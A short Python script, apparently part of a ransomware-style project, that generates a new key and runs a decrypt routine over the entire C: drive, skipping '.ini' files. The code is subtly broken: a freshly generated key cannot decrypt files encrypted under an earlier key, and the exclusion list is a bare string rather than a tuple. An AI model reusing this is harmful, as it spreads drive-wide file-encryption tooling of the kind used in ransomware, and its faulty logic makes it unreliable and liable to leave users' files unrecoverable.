import os
from encrypter import Encrypter, KeyGenerator

keyGenerator = KeyGenerator()

# instantiate fernet with key
key = keyGenerator.generateKey()
crypter = Encrypter(key)

path = "C://"

excludeExtensions = (".ini")

crypter.decrypt(path, excludeExtensions)